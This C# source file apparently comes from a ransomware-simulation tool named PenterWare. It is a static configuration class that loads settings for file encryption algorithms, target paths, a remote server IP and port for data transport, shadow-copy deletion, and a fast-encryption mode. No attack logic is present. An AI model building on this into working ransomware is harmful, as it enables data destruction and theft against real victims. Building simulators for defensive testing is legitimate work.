using PenterWare.Properties;

namespace PenterWare.Utils;

internal class ResourceData
{
	public static string TargetPathsCommaSeparated;

	public static string SymmetricAlgorithm;

	public static string AsymmetricAlgorithm;

	public static string Transport;

	public static string ServerIP;

	public static int Port;

	public static int MaxCopySizeMB;

	public static string FilesystemBackupType;

	public static string PathSuffixesCommaSeparated;

	public static bool Verbose;

	public static string DeleteShadowMode;

	public static string MutexToCreate;

	public static string RegistryPathsCommaSeparated;

	public static string UrlsCommaSeparated;

	public static string DNSsCommaSeparated;

	public static string Acts;

	public static string Strings;

	public static string PathsToAccessCommaSeperated;

	public static bool FastEncryptionMode;

	public static string NamedPipes;

	static ResourceData()
	{
		TargetPathsCommaSeparated = Resources.TargetPathsCommaSeparated;
		SymmetricAlgorithm = Resources.SymmetricAlgorithm;
		AsymmetricAlgorithm = Resources.AsymmetricAlgorithm;
		ServerIP = Resources.ServerIP;
		PathSuffixesCommaSeparated = Resources.PathSuffixesCommaSeparated;
		Transport = Resources.Transport;
		FilesystemBackupType = Resources.FilesystemBackupType;
		int.TryParse(Resources.Port, out Port);
		int.TryParse(Resources.MaxCopySizeMB, out MaxCopySizeMB);
		bool.TryParse(Resources.Verbose, out Verbose);
		DeleteShadowMode = Resources.DeleteShadowMode;
		MutexToCreate = Resources.MutexToCreate;
		RegistryPathsCommaSeparated = Resources.RegistryPathsCommaSeparated;
		UrlsCommaSeparated = Resources.UrlsCommaSeparated;
		DNSsCommaSeparated = Resources.DNSsCommaSeparated;
		Acts = Resources.Acts;
		PathsToAccessCommaSeperated = Resources.PathToAccess;
		Strings = Resources.Strings;
		bool.TryParse(Resources.FastEncryptionMode, out FastEncryptionMode);
		NamedPipes = Resources.NamedPipes;
	}
}
